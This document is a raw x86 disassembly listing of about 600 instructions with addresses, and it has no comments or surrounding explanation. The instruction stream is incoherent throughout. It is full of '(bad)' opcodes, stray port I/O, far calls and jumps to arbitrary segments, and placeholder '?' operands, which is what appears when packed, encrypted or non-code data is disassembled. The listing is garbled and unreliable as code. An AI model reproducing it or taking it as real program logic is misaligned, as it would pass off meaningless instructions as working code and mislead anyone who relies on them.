  40fac7:	jl     0x40face
  40fac9:	dec    eax
  40faca:	ja     0x40fa78
  40facc:	push   edx
  40facd:	pop    edi
  40face:	lds    ebx,FWORD PTR ds:0xe540fcd9
  40fad4:	rcl    BYTE PTR [esi+0x18dcc175],0xe6
  40fadb:	sbb    ecx,DWORD PTR [edx+0x729cd285]
  40fae1:	mov    al,0x68
  40fae3:	pop    ss
  40fae4:	push   ebp
  40fae5:	add    esp,ebp
  40fae7:	and    al,0xb5
  40fae9:	xor    ecx,DWORD PTR [ecx-0x6d]
  40faec:	(bad)  
  40faed:	dec    esp
  40faee:	inc    ebp
  40faef:	push   ss
  40faf0:	leave  
  40faf1:	xchg   esi,eax
  40faf2:	les    ebx,FWORD PTR [eax-0x12b37dfb]
  40faf8:	in     al,0x53
  40fafa:	dec    ebp
  40fafb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fafc:	pop    eax
  40fafd:	push   ds
  40fafe:	sar    BYTE PTR [esi-0x6c9bb9e7],1
  40fb04:	sub    al,0x21
  40fb06:	ins    BYTE PTR es:[edi],dx
  40fb07:	lea    esi,[eax+0x63b45199]
  40fb0d:	sbb    eax,0x8b1cbff4
  40fb12:	or     eax,0x93bcd9dd
  40fb17:	xor    al,cl
  40fb19:	inc    edx
  40fb1a:	sub    eax,0x257b0a6a
  40fb1f:	loop   0x40faef
  40fb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb22:	stos   DWORD PTR es:[edi],eax
  40fb23:	fs aam 0xe4
  40fb26:	xchg   edi,eax
  40fb27:	mov    fs,ebp
  40fb29:	sub    ebx,eax
  40fb2b:	xchg   ebx,eax
  40fb2c:	lahf   
  40fb2d:	push   es
  40fb2e:	sbb    dh,dh
  40fb30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb31:	mov    BYTE PTR [ecx-0x135bde5],ch
  40fb37:	std    
  40fb38:	dec    esi
  40fb39:	enter  0xced1,0xe6
  40fb3d:	test   al,0xdf
  40fb3f:	call   0xd5881cbb
  40fb44:	shl    al,1
  40fb46:	es nop
  40fb48:	test   eax,0x96d0b7a
  40fb4d:	mov    ebp,0xc2fb150f
  40fb52:	mov    bh,0x9d
  40fb54:	jmp    0x40fb61
  40fb56:	scas   eax,DWORD PTR es:[edi]
  40fb57:	dec    edi
  40fb58:	add    eax,DWORD PTR [ebp+0x7c8a314e]
  40fb5e:	daa    
  40fb5f:	(bad)  [ecx+0xf7be353]
  40fb65:	adc    al,0x2
  40fb67:	(bad)  
  40fb68:	rcr    BYTE PTR [ebx+0x4b3d8c16],1
  40fb6e:	dec    ecx
  40fb6f:	push   edi
  40fb70:	cdq    
  40fb71:	xlat   BYTE PTR ds:[ebx]
  40fb72:	ss add al,0x31
  40fb75:	call   0x946e:0x379660
  40fb7c:	std    
  40fb7d:	jmp    0x5a58cf0
  40fb82:	push   0xeaefb9df
  40fb87:	inc    esp
  40fb88:	sar    ebx,cl
  40fb8a:	mov    WORD PTR [edx-0x31],?
  40fb8d:	mov    ch,BYTE PTR [ebx]
  40fb8f:	or     ch,BYTE PTR [ecx]
  40fb91:	loope  0x40fbfc
  40fb93:	jmp    0x40fb65
  40fb95:	inc    edx
  40fb96:	mov    bl,0xdd
  40fb98:	or     al,0x72
  40fb9a:	outs   dx,DWORD PTR ds:[esi]
  40fb9b:	shr    DWORD PTR [esi+esi*4+0x6e],0x69
  40fba0:	xor    ebp,ecx
  40fba2:	xchg   esp,eax
  40fba3:	inc    ecx
  40fba4:	aad    0x68
  40fba6:	(bad)  
  40fba7:	dec    esp
  40fba8:	popa   
  40fba9:	out    0x54,al
  40fbab:	push   edi
  40fbac:	test   eax,0x26a51a43
  40fbb1:	mov    ds:0x3425aa02,al
  40fbb6:	jb     0x40fc23
  40fbb8:	(bad)  
  40fbb9:	int    0xa9
  40fbbb:	mov    ah,0xf0
  40fbbd:	jne    0x40fbcf
  40fbbf:	adc    dh,dh
  40fbc1:	cmp    DWORD PTR [ebx-0x7e140c45],ebx
  40fbc7:	sbb    DWORD PTR [edx+0x78],esp
  40fbca:	retf   0x8d9f
  40fbcd:	xchg   BYTE PTR [eax],bh
  40fbcf:	mov    esp,0xe007bba1
  40fbd4:	mov    dl,0xc9
  40fbd6:	mov    cl,0xd0
  40fbd8:	jb     0x40fb74
  40fbda:	mov    edi,0xba341643
  40fbdf:	js     0x40fc3e
  40fbe1:	aam    0xdb
  40fbe3:	mov    ds,WORD PTR ds:0x1c7dd22
  40fbe9:	pop    ebp
  40fbea:	jmp    0xcda1:0xd6b71f52
  40fbf1:	cdq    
  40fbf2:	rol    dh,0x10
  40fbf5:	leave  
  40fbf6:	mov    BYTE PTR [esi+0x159c4da0],bl
  40fbfc:	mov    esi,0x3d684292
  40fc01:	inc    esi
  40fc02:	or     BYTE PTR [edi+0x36c3b94b],bl
  40fc08:	xchg   esi,eax
  40fc09:	pop    gs
  40fc0b:	neg    dh
  40fc0d:	sbb    al,0xa7
  40fc0f:	jne    0x40fbd6
  40fc11:	mov    ecx,0x2a816380
  40fc16:	add    ebx,ebp
  40fc18:	lods   al,BYTE PTR ds:[esi]
  40fc19:	add    dh,0x64
  40fc1c:	dec    esi
  40fc1d:	add    edi,DWORD PTR [ebx]
  40fc1f:	rcl    esi,0xfa
  40fc22:	sbb    ah,dh
  40fc24:	fidivr WORD PTR [ebx+0x43791d17]
  40fc2a:	in     eax,0x20
  40fc2c:	jmp    0x40fc06
  40fc2e:	or     al,0x12
  40fc30:	stos   BYTE PTR es:[edi],al
  40fc31:	les    eax,FWORD PTR [ebp+esi*2-0x76]
  40fc35:	lds    ebx,FWORD PTR [ecx]
  40fc37:	jl     0x40fc64
  40fc39:	cmp    DWORD PTR [ebx+0x3de0fe5],eax
  40fc3f:	xchg   ecx,eax
  40fc40:	je     0x40fc7a
  40fc42:	add    ebx,edx
  40fc44:	pop    ebx
  40fc45:	call   0x120e:0xe57852f0
  40fc4c:	sbb    edx,DWORD PTR ds:[ebp-0x1]
  40fc50:	or     eax,0x147d413d
  40fc55:	and    eax,0x74d089ba
  40fc5a:	in     eax,0x50
  40fc5c:	push   edi
  40fc5d:	mov    esp,0x5b93175d
  40fc62:	add    eax,0x9bf5e9ab
  40fc67:	add    al,0x3c
  40fc69:	and    DWORD PTR [ebx-0x5d],0xfffffff4
  40fc6d:	mov    ds:0x422822bb,al
  40fc72:	cmp    DWORD PTR [edi-0x57ba70a2],ebx
  40fc78:	mov    bh,dl
  40fc7a:	bound  eax,QWORD PTR [ecx]
  40fc7c:	inc    eax
  40fc7d:	adc    DWORD PTR [esi],ebx
  40fc7f:	in     eax,0xbe
  40fc81:	xor    DWORD PTR [edx],esp
  40fc83:	add    BYTE PTR [eax-0x16],bh
  40fc86:	aaa    
  40fc87:	adc    ah,BYTE PTR [esp+eiz*8]
  40fc8a:	xor    al,0xeb
  40fc8c:	jge    0x40fc80
  40fc8e:	and    DWORD PTR [ebp-0x4d],ebp
  40fc91:	xor    BYTE PTR [esi-0x7d070f3b],dh
  40fc97:	jp     0x40fcec
  40fc99:	sbb    ah,BYTE PTR [edi+ebp*1+0x4aea9931]
  40fca0:	outs   dx,BYTE PTR ds:[esi]
  40fca1:	lods   al,BYTE PTR ds:[esi]
  40fca2:	lods   eax,DWORD PTR ds:[esi]
  40fca3:	dec    esp
  40fca4:	xchg   edi,eax
  40fca5:	push   esp
  40fca6:	rol    BYTE PTR [ebp+0x1da7ffc],0x2c
  40fcad:	sbb    BYTE PTR [eax],dh
  40fcaf:	push   ds
  40fcb0:	fwait
  40fcb1:	int    0xe2
  40fcb3:	sbb    DWORD PTR [esi+0x43714c5e],ebx
  40fcb9:	les    esp,FWORD PTR [eax+0x46]
  40fcbc:	out    0x95,al
  40fcbe:	pop    ss
  40fcbf:	mov    eax,0x79d82f7a
  40fcc4:	adc    eax,0xca0bdc42
  40fcc9:	ins    DWORD PTR es:[edi],dx
  40fcca:	sub    edi,DWORD PTR [edi-0x1e]
  40fccd:	lock xlat BYTE PTR ds:[ebx]
  40fccf:	cmp    eax,0x83e160a9
  40fcd4:	pop    esi
  40fcd5:	outs   dx,BYTE PTR es:[esi]
  40fcd7:	pop    edx
  40fcd8:	sti    
  40fcd9:	jmp    0x40fd0e
  40fcdb:	cmp    eax,0x1da937f2
  40fce0:	xchg   edi,eax
  40fce1:	sbb    BYTE PTR [ebp+ebp*1+0x1454f1ce],ah
  40fce8:	pop    es
  40fce9:	xlat   BYTE PTR ds:[ebx]
  40fcea:	in     al,dx
  40fceb:	in     al,dx
  40fcec:	mov    ah,0xe4
  40fcee:	sub    ecx,DWORD PTR [esi+0x400d3972]
  40fcf4:	sub    edx,DWORD PTR [esi-0x300cb50b]
  40fcfa:	adc    al,0x5e
  40fcfc:	(bad)  
  40fcfd:	loopne 0x40fd52
  40fcff:	into   
  40fd00:	imul   BYTE PTR [eax]
  40fd02:	loope  0x40fca2
  40fd04:	shl    DWORD PTR [ebx-0x7f],1
  40fd07:	lods   al,BYTE PTR ds:[esi]
  40fd08:	loope  0x40fca0
  40fd0a:	jns    0x40fd3f
  40fd0c:	mov    al,0x5c
  40fd0e:	xchg   edi,eax
  40fd0f:	mov    cl,0x3e
  40fd11:	push   ecx
  40fd12:	hlt    
  40fd13:	mov    al,0xcd
  40fd15:	sbb    DWORD PTR [ebp+0x6e42c85],ebp
  40fd1b:	push   edi
  40fd1c:	inc    ebp
  40fd1d:	jnp    0x40fd2b
  40fd1f:	mov    eax,0x7fb497a5
  40fd24:	ins    DWORD PTR es:[edi],dx
  40fd25:	fstp   QWORD PTR [esi+0x58]
  40fd28:	in     eax,dx
  40fd29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd2a:	mov    ah,0x3b
  40fd2c:	aam    0x65
  40fd2e:	push   ebp
  40fd2f:	mov    DWORD PTR [edx-0x37d11acb],ebx
  40fd35:	loopne 0x40fd59
  40fd37:	mov    ds:0x2fcd1a89,eax
  40fd3c:	mov    ch,0xa4
  40fd3e:	mov    eax,0xe07dc028
  40fd43:	xlat   BYTE PTR ds:[ebx]
  40fd44:	fnstenv [ecx-0x3d]
  40fd47:	or     al,BYTE PTR [ebx]
  40fd49:	xchg   edx,eax
  40fd4a:	popf   
  40fd4b:	and    al,0x6
  40fd4d:	jle    0x40fd26
  40fd4f:	fst    st(2)
  40fd51:	mov    bl,0x7b
  40fd53:	inc    ebp
  40fd54:	push   0x3
  40fd56:	mov    ah,BYTE PTR [edx-0x67c988a]
  40fd5c:	sbb    eax,0xcdbaa64a
  40fd62:	sbb    DWORD PTR [esi+0x4d],ecx
  40fd65:	loop   0x40fd4c
  40fd67:	mov    dl,0x95
  40fd69:	scas   al,BYTE PTR es:[edi]
  40fd6a:	inc    ebp
  40fd6b:	or     edi,ebp
  40fd6d:	mul    BYTE PTR [eax-0x1b033d0f]
  40fd73:	jae    0x40fd34
  40fd75:	inc    ebx
  40fd76:	mov    esp,0xe0b65c93
  40fd7b:	popa   
  40fd7c:	out    0x8a,eax
  40fd7e:	push   ds
  40fd7f:	jo     0x40fd4b
  40fd81:	lea    edx,[ebx]
  40fd83:	test   eax,0xf65dad64
  40fd88:	popa   
  40fd89:	les    eax,FWORD PTR [ebx-0x40]
  40fd8c:	inc    eax
  40fd8d:	pop    edi
  40fd8e:	mov    bh,0x77
  40fd90:	retf   
  40fd91:	inc    ecx
  40fd92:	mov    gs,WORD PTR [esi-0x16]
  40fd95:	and    DWORD PTR [edi],edi
  40fd97:	sbb    esp,DWORD PTR [edx]
  40fd99:	sbb    al,0x5d
  40fd9b:	fcom   QWORD PTR [eax-0x72]
  40fd9e:	xor    esi,DWORD PTR [esi+0x55a0f6f7]
  40fda4:	xlat   BYTE PTR ds:[ebx]
  40fda5:	jno    0x40fda8
  40fda7:	add    al,0xef
  40fda9:	sbb    dh,al
  40fdab:	(bad)  
  40fdad:	sbb    ecx,DWORD PTR [ecx]
  40fdaf:	fstp   TBYTE PTR [edx+0xa]
  40fdb2:	pop    esp
  40fdb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdb4:	pop    ds
  40fdb5:	mov    dl,0xd6
  40fdb7:	popf   
  40fdb8:	xchg   edx,eax
  40fdb9:	std    
  40fdba:	or     al,0xa0
  40fdbc:	sqrtps xmm1,XMMWORD PTR [edi]
  40fdbf:	mov    ebp,0xeaf259b7
  40fdc5:	les    ebp,FWORD PTR ds:0xcad362db
  40fdcb:	xchg   BYTE PTR [eax-0x71],dh
  40fdce:	femms  
  40fdd0:	sbb    BYTE PTR [ebx],ch
  40fdd2:	fistp  QWORD PTR [ebp-0x5]
  40fdd5:	cdq    
  40fdd6:	xor    eax,0x95817e1c
  40fddb:	cmc    
  40fddc:	mov    esi,0xf021721b
  40fde1:	daa    
  40fde2:	xor    al,0x76
  40fde4:	sub    ch,0x79
  40fde7:	cwde   
  40fde8:	ret    0xe10b
  40fdeb:	pushf  
  40fdec:	aam    0x7a
  40fdee:	add    al,0x8f
  40fdf0:	stos   DWORD PTR es:[edi],eax
  40fdf1:	clc    
  40fdf2:	call   0x5f2b0f62
  40fdf7:	add    bl,BYTE PTR [ebx-0x50]
  40fdfa:	jmp    0xa4f7bf61
  40fdff:	ficomp DWORD PTR [edx]
  40fe01:	clc    
  40fe02:	es dec edx
  40fe04:	gs or  al,ah
  40fe07:	pop    ecx
  40fe08:	xchg   DWORD PTR [esi+0x358a6090],edx
  40fe0e:	pop    esp
  40fe0f:	cmp    DWORD PTR [ecx-0x62],edi
  40fe12:	ficom  DWORD PTR [esi+0xcd11e54]
  40fe18:	xlat   BYTE PTR ds:[ebx]
  40fe19:	mov    esp,0x6a63924d
  40fe1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe1f:	dec    ecx
  40fe20:	add    ch,BYTE PTR [ebp-0x33abd606]
  40fe26:	loope  0x40fdae
  40fe28:	out    dx,al
  40fe29:	fmul   st(7),st
  40fe2b:	sub    bh,BYTE PTR [eax-0x658632fe]
  40fe31:	xchg   esp,eax
  40fe32:	pushf  
  40fe33:	dec    esi
  40fe34:	enter  0x4856,0xf6
  40fe38:	lds    ebx,FWORD PTR [ebx-0x44]
  40fe3b:	push   cs
  40fe3c:	adc    edi,ebx
  40fe3e:	daa    
  40fe3f:	sar    DWORD PTR [edx-0x46],0x9f
  40fe43:	push   0xb1eb4d4e
  40fe48:	(bad)  
  40fe49:	clc    
  40fe4a:	les    ebx,FWORD PTR [esi+0x648c8093]
  40fe50:	imul   ebp,DWORD PTR [ebx+esi*2-0x4c],0x76bf6f69
  40fe58:	xor    DWORD PTR ds:0xd4f66559,0x5878dce0
  40fe62:	mov    DWORD PTR [ecx+ebp*4],ebp
  40fe65:	mov    fs,WORD PTR [ebp-0xd]
  40fe68:	imul   ecx,DWORD PTR [ebp-0x80],0xe49bb00e
  40fe6f:	push   ebp
  40fe70:	(bad)  
  40fe71:	push   esp
  40fe72:	addr16 sahf 
  40fe74:	gs sbb al,0x99
  40fe77:	mov    WORD PTR [esi+0x2032d0cc],fs
  40fe7d:	mov    edi,0x53fee743
  40fe82:	push   esi
  40fe83:	adc    BYTE PTR [ebx+0x46],bl
  40fe86:	aas    
  40fe87:	repz and ah,BYTE PTR [eax+edi*1]
  40fe8b:	sbb    DWORD PTR [edi-0x21],0xafbab464
  40fe92:	dec    ebp
  40fe93:	ror    BYTE PTR [edi],0xe0
  40fe96:	pop    esp
  40fe97:	sbb    DWORD PTR [esi],ecx
  40fe99:	jecxz  0x40fe24
  40fe9b:	ror    BYTE PTR [ebx],cl
  40fe9d:	push   ecx
  40fe9e:	sar    dh,cl
  40fea0:	pop    es
  40fea1:	mov    edx,0xfb836260
  40fea6:	call   0xd433d794
  40feab:	mov    bh,0x74
  40fead:	stos   BYTE PTR es:[edi],al
  40feae:	popa   
  40feaf:	adc    eax,0xf8399688
  40feb4:	shl    BYTE PTR [ebx+0x39],0x16
  40feb8:	jg     0x40fe41
  40feba:	jecxz  0x40fe7e
  40febc:	add    al,BYTE PTR [edi]
  40febe:	retf   
  40febf:	sub    esi,DWORD PTR [esi]
  40fec1:	das    
  40fec2:	rcr    BYTE PTR [esi],1
  40fec4:	mov    edx,0xbf5c567
  40fec9:	dec    esp
  40feca:	jbe    0x40fee4
  40fecc:	pushf  
  40fecd:	sub    al,0xcc
  40fecf:	loopne 0x40ff17
  40fed1:	outs   dx,DWORD PTR ds:[esi]
  40fed2:	pop    edx
  40fed3:	int3   
  40fed4:	mov    ds:0xe79bf36d,al
  40fed9:	xchg   esi,eax
  40feda:	int3   
  40fedb:	pop    edx
  40fedc:	jmp    0x5fb07d72
  40fee1:	pop    edx
  40fee2:	inc    edx
  40fee3:	adc    BYTE PTR [esi+ecx*4-0x2d],bl
  40fee7:	cmp    ebx,DWORD PTR [edx-0x37]
  40feea:	add    al,0xe9
  40feec:	repnz and si,WORD PTR [edx]
  40fef0:	rep lods al,BYTE PTR ds:[esi]
  40fef2:	and    esi,ecx
  40fef4:	ja     0x40fee0
  40fef6:	push   esp
  40fef7:	fstp   DWORD PTR [eax+edi*8-0x6f4c6eab]
  40fefe:	or     al,ah
  40ff00:	inc    esi
  40ff01:	sbb    eax,0xc5f79c7d
  40ff06:	mov    ecx,0x2d197bf
  40ff0b:	inc    esi
  40ff0c:	cli    
  40ff0d:	adc    esp,esi
  40ff0f:	cwde   
  40ff10:	popf   
  40ff11:	(bad)  
  40ff12:	jp     0x40ff3a
  40ff14:	call   0x30d00ee6
  40ff19:	sbb    eax,0x23557863
  40ff1e:	aaa    
  40ff1f:	jmp    0x40ff6f
  40ff21:	lfs    ebx,FWORD PTR [edx-0xc]
  40ff25:	dec    ecx
  40ff26:	ss retf 0x12ad
  40ff2a:	add    al,0xc2
  40ff2c:	cld    
  40ff2d:	daa    
  40ff2e:	mov    al,ds:0xf937347a
  40ff33:	pop    ss
  40ff34:	mov    ebx,0x9408542e
  40ff39:	mov    ecx,0x462099f5
  40ff3e:	mul    DWORD PTR ds:0xc2244682
  40ff44:	das    
  40ff45:	mov    ebx,0xde4e7f7b
  40ff4a:	cmp    eax,0x85804117
  40ff4f:	mov    esi,0xf73b9854
  40ff54:	xchg   DWORD PTR [ecx+0x3f7501a5],eax
  40ff5a:	call   edi
  40ff5c:	icebp  
  40ff5d:	sar    BYTE PTR [esi-0x57],0xbb
  40ff61:	cld    
  40ff62:	hlt    
  40ff63:	or     al,0xdc
  40ff65:	jb     0x40ffa1
  40ff67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff68:	jg     0x40ff54
  40ff6a:	mov    esp,0x69c32a3c
  40ff6f:	pop    es
  40ff70:	fadd   QWORD PTR [edi]
  40ff72:	sbb    ah,BYTE PTR [edi]
  40ff74:	push   es
  40ff75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff76:	fadd   DWORD PTR ds:0x378adfd0
  40ff7c:	jmp    0xcdab:0x549b768d
  40ff83:	sbb    BYTE PTR [eax+0x48],ch
  40ff86:	call   0x99ca31d7
  40ff8b:	dec    eax
  40ff8c:	out    dx,eax
  40ff8d:	mov    al,0xf5
  40ff8f:	into   
  40ff90:	pop    ss
  40ff91:	sub    al,0x88
  40ff93:	(bad)  
  40ff94:	dec    esi
  40ff95:	shl    DWORD PTR [esi+0x21],0xc
  40ff99:	pop    edi
  40ff9a:	or     edx,esp
  40ff9c:	add    BYTE PTR [edx-0x77],dl
  40ff9f:	add    ch,BYTE PTR ds:0x207e232a
  40ffa5:	mov    BYTE PTR [eax],cl
  40ffa7:	stos   DWORD PTR es:[edi],eax
  40ffa8:	sub    ebx,esi
  40ffaa:	mov    dl,al
  40ffac:	sub    BYTE PTR [ecx+ecx*1+0x678a4122],bh
  40ffb3:	icebp  
  40ffb4:	test   al,0x1e
  40ffb6:	mov    dl,0xcd
  40ffb8:	repz sub ch,BYTE PTR [edi-0x6379b91]
  40ffbf:	sar    BYTE PTR ds:0x1b689464,cl
  40ffc5:	int3   
  40ffc6:	imul   ebx
  40ffc8:	xlat   BYTE PTR ds:[ebx]
  40ffc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffca:	mov    ah,BYTE PTR [esi]
  40ffcc:	pop    eax
  40ffcd:	cmc    
  40ffce:	inc    edx
  40ffcf:	or     BYTE PTR [ebp-0x2097f08c],cl
  40ffd5:	mov    bl,0xd
  40ffd7:	xor    al,BYTE PTR [ebx]
  40ffd9:	or     eax,0x7ae02ba
  40ffde:	sahf   
  40ffdf:	mov    ss,WORD PTR [edx-0x20]
  40ffe2:	xor    DWORD PTR [esi],eax
  40ffe4:	in     al,0x33
  40ffe6:	in     eax,dx
  40ffe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe8:	fnsave [edx-0x71dbb8dc]
  40ffee:	xchg   edi,eax
  40ffef:	nop
  40fff0:	jp     0x41000d
  40fff2:	repz fild WORD PTR [esi+0x75]
  40fff6:	sti    
  40fff7:	push   esi
  40fff8:	retf   0xeeb3
  40fffb:	jbe    0x410077
  40fffd:	std    
  40fffe:	test   eax,0x8167ed1d
  410003:	push   0x21271329
  410008:	fwait
  410009:	lods   al,BYTE PTR ds:[esi]
  41000a:	xchg   ecx,eax
  41000b:	or     al,al
  41000d:	pop    eax
  41000e:	or     ebp,DWORD PTR [edx]
  410010:	lahf   
  410011:	or     al,dl
  410013:	dec    edi
  410014:	daa    
  410015:	scas   eax,DWORD PTR es:[edi]
  410016:	xor    eax,DWORD PTR [ebx+0x12]
  410019:	adc    bh,BYTE PTR [esi+eiz*1+0x232833b8]
  410020:	stc    
  410021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410022:	cmc    
  410023:	stos   DWORD PTR es:[edi],eax
  410024:	jge    0x4100a5
  410026:	dec    eax
  410027:	fidiv  WORD PTR [ebx+0x1c585ee6]
  41002d:	xchg   edi,eax
  41002e:	mov    ?,WORD PTR ds:0x3221688d
  410034:	call   0xca7c:0xadbf7990
  41003b:	push   ds
  41003c:	or     edi,DWORD PTR [esi+0x44]
  41003f:	fs jno 0x410000
  410042:	xchg   edx,eax
  410043:	mov    bh,0x45
  410045:	xor    eax,0xbd62927
  41004a:	cmp    BYTE PTR [ebp+0x36bc5a66],dh
  410050:	add    al,0xb0
  410052:	shl    BYTE PTR [ebp-0xb],1
  410055:	popa   
  410056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410057:	xor    eax,DWORD PTR [esi-0x4fda7c28]
  41005d:	dec    esi
  41005e:	imul   esp,esi,0x4c02b15a
  410064:	(bad)  
  410065:	(bad)  
  410066:	cmp    ebx,DWORD PTR [esi]
  410068:	call   0x102c:0x47875751
  41006f:	das    
  410070:	xchg   edx,eax
  410071:	repz jle 0x41008e
  410074:	cld    
  410075:	xchg   esi,eax
  410076:	in     eax,0x90
  410078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410079:	lahf   
  41007a:	sub    al,0x11
  41007c:	jecxz  0x41005c
  41007e:	mov    eax,0xccf4268
  410083:	fidiv  DWORD PTR [edi-0x5fe10f44]
  410089:	jg     0x4100ed
  41008b:	fstp   QWORD PTR [edi]
  41008d:	jbe    0x410059
  41008f:	pop    es
  410090:	int3   
  410091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410092:	pop    es
  410093:	sahf   
  410094:	test   eax,0x7ebb76d7
  410099:	mov    cl,0xf5
  41009b:	sub    DWORD PTR [edx+0x44],ebx
  41009e:	jae    0x4100e9
  4100a0:	add    DWORD PTR [eax+0x4050fad7],edx
  4100a6:	mov    bl,0xcc
  4100a8:	and    esp,DWORD PTR [eax]
  4100aa:	cli    
  4100ab:	adc    al,0xa7
  4100ad:	ins    BYTE PTR es:[edi],dx
  4100ae:	hlt    
  4100af:	mov    WORD PTR [edx-0x26],fs
  4100b2:	mov    edx,0xd3afc470
  4100b7:	repnz inc esi
  4100b9:	sub    bh,ch
  4100bb:	pop    es
  4100bc:	bound  ebp,QWORD PTR [ecx+0x5965014a]
  4100c2:	push   0x45b8b70f
  4100c7:	inc    ecx
  4100c8:	dec    BYTE PTR [ecx-0x502e77f8]
  4100ce:	in     eax,dx
  4100cf:	push   edx
  4100d0:	push   edx
  4100d1:	mov    ds:0xbb8fb4a1,eax
  4100d6:	jge    0x4100b8
  4100d8:	shl    DWORD PTR [edx+ebx*1+0x1c],1
  4100dc:	repnz cmp BYTE PTR [edx],al
  4100df:	aad    0xcb
  4100e1:	aad    0x99
  4100e3:	jmp    0x7304:0xbfb02771
  4100ea:	fnstcw WORD PTR [ecx+0xd73addd]
  4100f0:	jle    0x410104
  4100f2:	jae    0x410129
  4100f4:	mov    dh,0x3d
  4100f6:	mul    BYTE PTR [edx]
  4100f8:	retf   0xe52
  4100fb:	xchg   ebp,eax
  4100fc:	and    DWORD PTR ds:0xf6511c52,esi
  410102:	jo     0x410171
  410104:	out    dx,al
  410105:	out    0x72,eax
  410107:	jg     0x41016b
  410109:	jns    0x410110
  41010b:	adc    ebp,DWORD PTR [ecx]
  41010d:	pop    esi
  41010e:	or     BYTE PTR [edx-0x2c],dh
  410111:	xor    DWORD PTR [ecx],ebx
  410113:	inc    ebx
  410114:	in     eax,0xb6
  410116:	retf   
  410117:	test   DWORD PTR [ebx+esi*2+0x7f1f68ba],edx
  41011e:	out    0x42,eax
  410120:	dec    ecx
  410121:	xchg   ebp,eax
  410122:	repnz fst QWORD PTR [ecx+0x1c3a0662]
  410129:	add    BYTE PTR [edx-0x7a8b65a1],0xc1
  410130:	cmp    DWORD PTR es:[ebx+esi*4],eax
  410134:	xchg   ecx,eax
  410135:	mov    al,ds:0xfb9c33d
  41013a:	mov    ch,0x6a
  41013c:	pop    eax
  41013d:	add    eax,0x5870f576
  410142:	(bad)  
  410143:	pop    edi
  410144:	mov    edx,0xa2a36ed5
  410149:	or     eax,0x409849df
  41014e:	pop    edi
  41014f:	and    DWORD PTR [ecx],ebx
  410151:	iret   
  410152:	pop    ebp
  410153:	xchg   ebx,eax
  410154:	jae    0x41012e
  410156:	add    bh,al
  410158:	cmp    eax,0x4dd5f920
  41015d:	pop    edi
  41015e:	int    0x53
  410160:	or     bl,BYTE PTR [eax-0x40246729]
  410166:	jb     0x410179
  410168:	jns    0x4100f6
  41016a:	sub    BYTE PTR [ebp+0xa83cd9e],0x58
  410171:	xchg   esp,eax
  410172:	in     al,0x4c
  410174:	fbstp  TBYTE PTR [esi+0x52]
  410177:	push   esp
  410178:	xor    ch,dh
  41017a:	mov    cl,0xd5
  41017c:	iret   
  41017d:	(bad)  
  41017e:	outs   dx,BYTE PTR ds:[esi]
  41017f:	push   es
  410180:	add    DWORD PTR [edx-0x47],edi
  410183:	clc    
  410184:	xchg   edx,eax
  410185:	mov    WORD PTR [eax],ss
  410187:	inc    ebx
  410188:	pop    DWORD PTR [esi]
  41018a:	data16 mov BYTE PTR [ebx-0x877bdd9],ch
  410191:	lea    edx,[esi+0x47937d91]
  410197:	stos   DWORD PTR es:[edi],eax
  410198:	and    BYTE PTR [ebx],ch
  41019a:	rol    dh,1
  41019c:	sar    esi,1
  41019e:	imul   BYTE PTR fs:[ebx]
  4101a1:	rcr    BYTE PTR [ecx-0x49],0xc5
  4101a5:	(bad)  
  4101a8:	pusha  
  4101a9:	out    0x5e,eax
  4101ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ac:	or     BYTE PTR [eax-0x60ef023c],ch
  4101b2:	adc    al,BYTE PTR [edx+0x7c5ccc4d]
  4101b8:	mov    edi,0x242fbaf2
  4101bd:	(bad)  
  4101be:	sar    edx,cl
  4101c0:	adc    ebp,esp
  4101c2:	jle    0x4101f3
  4101c4:	mov    ecx,0xf4e12018
  4101c9:	cdq    
  4101ca:	fdiv   st(3),st
  4101cc:	dec    esi
  4101cd:	ret    
  4101ce:	mov    ds:0x4efc6878,al
  4101d3:	rcr    BYTE PTR [edi+0x7f],cl
  4101d6:	fmul   QWORD PTR [edi+ebp*8]
  4101d9:	scas   al,BYTE PTR es:[edi]
  4101da:	outs   dx,BYTE PTR ds:[esi]
  4101db:	fwait
  4101dc:	sahf   
  4101dd:	jmp    0x4101ce
  4101df:	dec    ebp
  4101e0:	mov    ?,esi
  4101e2:	cdq    
  4101e3:	popf   
  4101e4:	pop    eax
  4101e5:	pop    eax
  4101e6:	call   0x510f:0x3d48a638
  4101ed:	pop    edx
  4101ee:	mov    ds:0x430181f4,eax
  4101f3:	mov    BYTE PTR [edi+0x1ab2715b],cl
  4101f9:	add    eax,0xa55d6d32
  4101fe:	leave  
  4101ff:	test   al,0xf5
  410201:	mov    edx,DWORD PTR [esi-0x53]
  410204:	or     DWORD PTR [edi+0xbc3c6d],ebx
  41020a:	mov    WORD PTR [edi+0xa7ccb32],ds
  410210:	retf   0x6b1c
  410213:	stos   BYTE PTR es:[edi],al
  410214:	out    dx,al
  410215:	rcr    ah,cl
  410217:	ins    BYTE PTR es:[edi],dx
  410218:	sbb    eax,0xb89c1f45
  41021d:	or     al,0x47
  41021f:	and    ebx,edx
  410221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410222:	mov    ebp,0x7953f315
  410227:	aaa    
  410228:	out    0x9b,eax
  41022a:	push   cs
  41022b:	fst    QWORD PTR [edi+edx*2+0x4ec71fe5]
  410232:	scas   eax,DWORD PTR es:[edi]
  410233:	fbld   TBYTE PTR [eax+0x42ec3e96]
  410239:	icebp  
  41023a:	pop    esi
  41023b:	fsubr  DWORD PTR [ebp+0x742577c9]
  410241:	cmp    eax,0xd3a717c8
  410246:	ficom  DWORD PTR [edi+ebp*4]
